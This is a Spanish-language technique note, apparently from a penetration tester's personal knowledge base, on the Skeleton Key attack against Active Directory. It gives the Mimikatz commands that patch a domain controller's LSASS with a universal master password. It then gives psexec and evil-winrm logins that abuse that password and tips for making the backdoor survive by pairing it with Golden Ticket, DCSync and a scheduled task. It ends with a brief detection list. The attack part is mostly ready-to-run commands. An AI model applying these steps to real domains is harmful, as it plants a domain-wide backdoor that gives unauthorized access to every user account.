---
aliases:
  - "Custom SSP"
  - "DSRM Backdoor"
tags:
  - estado/completo
  - asset/active-directory
  - technique/persistence
  - cred/ntlm
kind: Technique
linked:
  - "[[Mimikatz Cheatsheet]]"
  - "[[DCSync]]"
---
# Skeleton Key

> [!info]
> Patch en LSASS del DC que inyecta una master password aceptada por TODOS los usuarios del dominio. Persistencia silenciosa con backdoor universal.

***

## Prerrequisitos

- **DA o equivalente** en el DC (NT AUTHORITY\SYSTEM en lsass).
- Mimikatz / Rubeus / Impacket con módulo de Skeleton Key.

***

## Inyección

```bash
# Mimikatz local en DC
privilege::debug
misc::skeleton

# Output: ¡Funcionó! → master password "mimikatz" inyectada para todos los users
```

Resultado:
- User existente con su pwd → sigue funcionando
- Mismo user con pwd `mimikatz` → funciona también

***

## Uso post-injection

```bash
# Login con cualquier user del domain usando "mimikatz"
psexec.py 'domain.local/admin:mimikatz'@<dc>
evil-winrm -i <dc> -u admin -p mimikatz
```

***

## Persistencia

⚠️ **NO sobrevive reboot del DC** — el patch es in-memory. Tras restart se pierde.

Para persistencia real: combinar con [[Golden Ticket]] o [[DCSync]] + planted scheduled task.

***

## Detección

- Behavioral: lsass modificado por proceso desconocido.
- AV/EDR signatures conocidas (Mimikatz IOC).
- Diff hash de lsass.exe en memoria.

***

## Notas Relacionadas

- [[Mimikatz Cheatsheet]]
- [[DCSync]]
- [[Golden Ticket]]
- [[LSASS Dumping]]
